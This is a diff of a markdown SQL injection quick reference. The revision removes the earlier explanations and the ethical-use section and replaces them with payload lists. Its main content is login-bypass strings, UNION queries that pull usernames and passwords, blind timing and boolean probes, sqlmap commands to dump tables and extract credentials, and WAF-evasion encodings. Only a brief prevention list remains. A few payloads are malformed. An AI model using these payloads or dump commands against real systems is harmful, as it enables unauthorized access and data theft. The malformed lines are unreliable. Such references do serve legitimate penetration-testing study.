@@ -1,310 +1,195 @@
-# 💉 SQL Injection Quick Ref
+# 💉 SQL Injection Quick Reference
 
-> SQL injection is an injection flaw where attacker-controlled input is interpreted as part of a SQL query. It can lead to authentication bypass, data extraction, privilege escalation, or remote command execution in some stacks.
+## What is SQL Injection?
 
-## 1) Core idea
-
-```sql
-SELECT * FROM users WHERE username = 'admin' AND password = 'pass';
-```
-
-If input is not properly sanitized, input like:
-
-```text
-' OR '1'='1
-```
-
-can turn into:
-
-```sql
-SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'pass';
-```
-
-This may make the condition always true.
+SQL injection is a web vulnerability that allows attackers to manipulate database queries by injecting malicious SQL code.
 
 ---
 
-## 2) Basic payloads
+## Basic Payloads
 
-### Authentication bypass
-
-```sql
-' OR '1'='1
-```
+### Authentication Bypass
 
 ```sql
 admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or 1=1 --
+' or 1=1 --
+' or 'x'='x
+' or 1=1; --
 ```
 
+### UNION-Based Injection
+
 ```sql
-' OR 1=1 -- -
+' UNION SELECT NULL,NULL,NULL --
+' UNION SELECT 1,2,3 --
+' UNION SELECT username,password FROM users --
+' UNION SELECT NULL,user(),version() --
 ```
 
-### Numeric injection
+### Time-Based Blind
 
 ```sql
-1 OR 1=1
+' AND SLEEP(5) --
+' AND BENCHMARK(10000000,SHA1('test')) --
+' AND WAITFOR DELAY '00:00:05' --
+' UNION SELECT SLEEP(5) --
 ```
 
+### Boolean-Based Blind
+
 ```sql
-1 UNION SELECT null,null
+' AND '1'='1
+' AND '1'='2
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64 --
 ```
 
 ---
 
-## 3) Union-based SQLi
-
-### Typical flow
-
-```sql
-SELECT name, email FROM users WHERE id = 1 UNION SELECT username, password FROM admins;
-```
-
-### Useful payloads
-
-```sql
-' UNION SELECT NULL, NULL --
-```
-
-```sql
-' UNION SELECT username, password FROM users --
-```
-
-```sql
-' UNION SELECT version(), database() --
-```
-
-### Check column count
-
-```sql
-' ORDER BY 1 --
-' ORDER BY 2 --
-' ORDER BY 3 --
-```
-
-When the query errors, the correct column count is known.
-
----
-
-## 4) Boolean blind SQL injection
-
-```sql
-' AND 1=1 --
-' AND 1=2 --
-```
-
-Payloads used to infer true/false responses:
-
-```sql
-' AND SUBSTRING(database(),1,1)='a' --
-```
-
-```sql
-' AND LENGTH(database())=8 --
-```
-
-```sql
-' AND (SELECT COUNT(*) FROM users)>0 --
-```
-
-This relies on timing or response differences from the application.
-
----
-
-## 5) Time-based blind SQLi
-
-MySQL / MariaDB:
-
-```sql
-' OR SLEEP(5) --
-```
-
-PostgreSQL:
-
-```sql
-' OR pg_sleep(5) --
-```
-
-MSSQL:
-
-```sql
-' WAITFOR DELAY '00:00:05' --
-```
-
----
-
-## 6) Error-based SQLi
-
-Often easier because the DB returns error output.
-
-```sql
-' UNION SELECT @@version --
-```
-
-```sql
-' OR 1=CONVERT(int,(SELECT @@version)) --
-```
-
-```sql
-' UNION SELECT user(), database() --
-```
-
----
-
-## 7) Common DB queries
+## Database Detection
 
 ### MySQL
-
 ```sql
-SELECT version();
-SELECT database();
-SELECT user();
-SHOW TABLES;
-SELECT * FROM information_schema.tables;
-```
-
-### PostgreSQL
-
-```sql
-SELECT version();
-SELECT current_database();
-SELECT current_user;
-SELECT table_name FROM information_schema.tables;
+' UNION SELECT VERSION() --
+' AND @@version LIKE '5%' --
 ```
 
 ### MSSQL
-
 ```sql
-SELECT @@VERSION;
-SELECT DB_NAME();
-SELECT SUSER_SNAME();
-SELECT name FROM master.dbo.sysdatabases;
+' AND @@version --
+' UNION SELECT @@version --
+```
+
+### Oracle
+```sql
+' UNION SELECT banner FROM v$version --
+```
+
+### PostgreSQL
+```sql
+' UNION SELECT version() --
 ```
 
 ---
 
-## 8) Finding injection points
+## Common Queries
 
-Look for:
-
-- search boxes
-- login forms
-- parameterized URLs
-- filter/sort pages
-- API query parameters
-- cookie values
-- user-controlled headers
-
-Typical examples:
-
-```text
-?id=1
-?search=admin
-?user=alice
-?category=books
+### Extract Table Names (MySQL)
+```sql
+' UNION SELECT table_name FROM information_schema.tables --
 ```
 
----
-
-## 9) Quick testing workflow
-
-1. Inject a quote: `'`
-2. Check for error message or changed response
-3. Try `OR 1=1`
-4. Check column count with `ORDER BY`
-5. Use `UNION SELECT` to read data
-6. Enumerate DB metadata
-7. Extract user/password hashes
-8. Check for privilege escalation opportunities
-
----
-
-## 10) Example login bypass
-
-Original query:
-
+### Extract Column Names (MySQL)
 ```sql
-SELECT * FROM users WHERE username = 'admin' AND password = 'secret';
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
 ```
 
-Payload:
-
+### Extract Data (MySQL)
 ```sql
-admin' OR '1'='1' --
-```
-
-Result:
-
-```sql
-SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = 'secret';
-```
-
-This often causes the login check to always evaluate true.
-
----
-
-## 11) WAF / filtering evasion ideas
-
-```sql
-admin'/**/OR/**/'1'='1
-```
-
-```sql
-admin'-- -
-```
-
-```sql
-' OR 'a'='a
-```
-
-```sql
-' UNION ALL SELECT NULL,NULL --
-```
-
-Some defenses block obvious payloads, so obfuscation and encoding may still be needed in testing labs.
-
----
-
-## 12) Defensive controls
-
-- Use parameterized queries / prepared statements
-- Validate and normalize user input
-- Apply least privilege database accounts
-- Disable verbose SQL errors in production
-- Use web app firewalls with careful tuning
-- Audit database logs for suspicious queries
-
----
-
-## 13) Ethical use
-
-Only use SQLi testing in:
-
-- authorized environments
-- your own lab
-- CTF/ethical security practice
-- client engagements with explicit permission
-
-Do not test or exploit production systems without approval.
-
----
-
-## 14) Common cheat payloads
-
-```sql
-' OR 1=1 --
-' OR '1'='1
-admin' --
-' UNION SELECT NULL --
 ' UNION SELECT username,password FROM users --
-' AND SUBSTRING(database(),1,1)='a' --
-' OR SLEEP(5) --
+' UNION SELECT user(),database() --
+```
+
+### Extract Data (MSSQL)
+```sql
+' UNION SELECT name FROM sysobjects WHERE xtype='U' --
+' UNION SELECT * FROM sys.tables --
 ```
 
 ---
 
-## 15) Final reminder
+## SQLMap Usage
 
-The best SQL injection defense is not a long list of filters — it is correct query construction. Prepared statements and strong input validation are the standard safe practice.
+### Basic Detection
+```bash
+sqlmap -u "http://target.com/page.php?id=1"
+```
 
+### List Databases
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+```
+
+### List Tables
+```bash
+sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
+```
+
+### Dump Table Data
+```bash
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump
+```
+
+### Extract Credentials
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --passwords
+```
+
+### POST Data
+```bash
+sqlmap -u "http://target.com/login" --data="username=admin&password=test"
+```
+
+### Batch Mode (No Prompts)
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --batch
+```
+
+### Specify Risk/Level
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --risk=3 --level=5
+```
+
+---
+
+## Bypass Techniques
+
+### Case Variation
+```sql
+SeLeCt * FrOm users
+UniOn SeLeCt 1,2,3
+```
+
+### Comment Variations
+```sql
+-- comment
+# comment
+/* comment */
+/*! MySQL specific */
+```
+
+### Whitespace Bypass
+```sql
+SELECT/**/FROM/**/users
+SELECT%20FROM%20users
+```
+
+### Encoding
+```sql
+SELECT CHAR(102,114,111,109)
+0x73656c656374
+```
+
+---
+
+## Detection Indicators
+
+- Single quote causes error
+- AND/OR conditions change response
+- Time delays occur
+- Boolean responses differ
+- UNION queries return data
+
+---
+
+## Prevention
+
+- Use prepared statements / parameterized queries
+- Input validation and sanitization
+- Least privilege database accounts
+- Web Application Firewall (WAF)
+- Regular security testing
 
